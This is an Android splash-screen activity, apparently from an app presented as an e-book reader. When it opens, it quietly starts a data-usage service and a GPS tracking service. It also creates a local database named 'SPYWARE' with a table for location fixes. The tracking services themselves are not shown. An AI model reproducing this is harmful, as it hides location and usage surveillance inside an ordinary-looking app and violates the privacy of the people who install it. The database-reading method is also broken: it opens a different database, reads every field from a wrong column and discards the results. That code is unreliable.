package com.fest.project;

import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.view.animation.Animation;
import android.view.animation.Animation.AnimationListener;
import android.view.animation.AnimationUtils;
import android.view.animation.LayoutAnimationController;
import android.widget.TableLayout;
import android.widget.TableRow;
import android.widget.TextView;

public class Starting_Screen extends Activity 
{
	 SQLiteDatabase db;
	@Override
    public void onCreate(Bundle savedInstanceState)
	{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.starting_screen_layout);

        Intent dataUsageservice = new Intent(getApplicationContext(), CalcDataUsage.class);
        startService(dataUsageservice); 
        
        Intent gps_service = new Intent(getApplicationContext(), GPSTracker.class);
        startService(gps_service);
        
        create_database();
        view_animation();
	}
	
	public void create_database()
    {
    	db = openOrCreateDatabase("SPYWARE", MODE_PRIVATE, null);
		db.execSQL("create table if not exists GPS_Tracker (Latitude REAL ,longitude REAL,Accuracy REAL,Provider TEXT,time INTEGER);");
		db.close(); 
    }
	
	public void read_database_of_first_table()
	{
		db = openOrCreateDatabase("Challenge__EBookBook_Reader", MODE_PRIVATE , null);
		Cursor mCursor = db.rawQuery("Select * from GPS_Tracker",null);
		
		if( mCursor != null)
		{
			
			mCursor.moveToFirst();
		
			while( !mCursor.isAfterLast() )
			{
			//	long id = mCursor.getLong(mCursor.getColumnIndex("Aid"));
				double Latitude =  mCursor.getDouble(mCursor.getColumnIndex("Author_name"));
				double longitude =  mCursor.getDouble(mCursor.getColumnIndex("Author_name"));
				double Accuracy =  mCursor.getDouble(mCursor.getColumnIndex("Author_name"));
				double Provider =  mCursor.getDouble(mCursor.getColumnIndex("Author_name"));
				
				
				//,Accuracy REAL,Provider TEXT,time INTEGER
				
				mCursor.moveToNext();
			}
			
			ContentValues cv = new ContentValues();
			db.close();
		}
	}
	
	@Override
	protected void onPause() {
		super.onPause();
		TextView logo1 = (TextView) findViewById(R.id.TextViewTopTitle);
		logo1.clearAnimation();
		
		TextView logo2 = (TextView) findViewById(R.id.starting_logo_welcome);
		logo2.clearAnimation(); 
		
		TableLayout table = (TableLayout) findViewById(R.id.Table_Layout_starting_screen);
	     for(int i=0;i<table.getChildCount();i++)
	     {
	    	 TableRow row = (TableRow)table.getChildAt(i); 
	    	 row.clearAnimation();
	     }
		
	 }
	
	 public void view_animation()
	 {
		 TextView logo = (TextView) findViewById(R.id.TextViewTopTitle);
		 Animation fade1 =AnimationUtils.loadAnimation(this, R.anim.fade_in);
	     logo.startAnimation(fade1);
		
	     logo = (TextView) findViewById(R.id.starting_logo_welcome);
	     Animation fade2 =AnimationUtils.loadAnimation(this, R.anim.fade_in2);
	     logo.startAnimation(fade2);
	      
	     logo =  (TextView) findViewById(R.id.starting_logo_EBook);
	     logo.startAnimation(fade2);
	     
	     fade1 = AnimationUtils.loadAnimation(this, R.anim.custom_anim);
	     LayoutAnimationController controller = new LayoutAnimationController(fade1);
	     fade2.setAnimationListener(new AnimationListener() 
	     {
			
			public void onAnimationStart(Animation animation){}
			public void onAnimationRepeat(Animation animation) {} 
			 
			public void onAnimationEnd(Animation animation) {
				startActivity(new Intent(Starting_Screen.this , Screen_for_menu.class));
				Starting_Screen.this.finish();
			}
		});
	     
	     TableLayout table =  (TableLayout) findViewById(R.id.Table_Layout_starting_screen);
	     for(int i=0;i<table.getChildCount();i++)
	     {
	    	 TableRow row = (TableRow)table.getChildAt(i); 
	    	 row.setLayoutAnimation(controller);
	     }
	 }
	 
}